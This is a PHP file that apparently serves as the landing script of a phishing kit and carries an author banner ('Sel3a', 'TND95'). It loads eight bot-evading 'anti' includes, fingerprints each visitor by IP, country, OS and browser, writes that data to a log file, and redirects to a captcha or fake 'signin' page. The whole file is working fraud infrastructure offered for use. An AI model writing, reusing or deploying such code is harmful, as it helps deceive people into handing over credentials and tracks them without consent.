<?php 
/*
  _______ _           _       _      _______    
 |__   __(_)Sel3a    | |TND95| |    |__   __|   
    | |   _ _ __   __| | __ _| |_The   | |_ __  
    | |  | | '_ \ / _` |/ _` | | | | | | | '_ \ 
    | |  | | | | | (_| | (_| | | |_| |_| | | | |
    |_|  |_|_| |_|\__,_|\__,_|_|\__, (_)_|_| |_|
     Just For Fun!               __/ |          
*/
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';
ob_start();
session_start();
require '../extra/algo.php';
$_SESSION['language']=getLanguage();
$_SESSION['ip']=clientData('ip');
$_SESSION['ip_countryName']=clientData('country');
$_SESSION['ip_countryCode']=clientData('code');
$_SESSION['currency']=clientData('currency');
$_SESSION['os']=getOs();
$_SESSION['browser']=getBrowser();
date_default_timezone_set('GMT');
$dateNow=date("d/m/Y h:i:s A");
$code="{$_SESSION['ip']} | {$dateNow} | {$_SESSION['ip_countryName']} | {$_SESSION['os']} | {$_SESSION['browser']}\r\n";
$save=fopen("../log.txt","a+");
fwrite($save,$code);
fclose($save);
include '../extra/mine.php';
if ($show_captcha=="yes") {
exit(header("Location: captcha"));
}else{
	exit(header("Location: signin"));

}
?>